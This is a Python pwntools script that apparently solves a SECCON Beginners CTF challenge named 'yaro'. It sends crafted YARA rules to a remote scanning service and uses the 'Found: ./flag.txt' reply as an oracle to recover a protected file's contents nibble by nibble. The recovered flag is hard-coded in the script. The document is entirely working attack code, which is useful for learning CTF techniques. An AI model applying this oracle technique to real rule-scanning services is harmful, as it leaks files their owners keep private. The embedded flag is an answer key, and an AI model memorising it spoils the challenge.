#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

remote_host = {'host':'yaro.beginners.seccon.games', 'port':5003}

def main():
    # flag = b'ctf4b{'
    flag = b'ctf4b{Y3t_An0th3r_R34d_Opp0rtun1ty}'

    rule = ''' rule maybe_flag {{
    strings:
        $hex_string = {{{}}}
    condition:
        $hex_string
}}
'''

    while not flag.endswith(b'}'):
        cand = 0
        for h in range(2, 8):
            with remote(**remote_host) as conn:
                hex_flag = '{} {:x}?'.format(flag.hex(' '), h)

                conn.sendlineafter(b'rule:', rule.format(hex_flag).encode())
                if b'Found: ./flag.txt' in conn.recvall():
                    cand = h
                    break

        if cand == 0:
           raise 

        for l in range(0x10):
            with remote(**remote_host) as conn:
                hex_flag = '{} {:x}{:x}'.format(flag.hex(' '), cand, l)

                conn.sendlineafter(b'rule:', rule.format(hex_flag).encode())
                if b'Found: ./flag.txt' in conn.recvall():
                    cand *= 0x10
                    cand += l
                    break

        flag += bytes([cand])
        info(f'found: {cand:x} {flag.decode()}')

    success(f'FLAG: {flag.decode()}')

if __name__=='__main__':
    main()

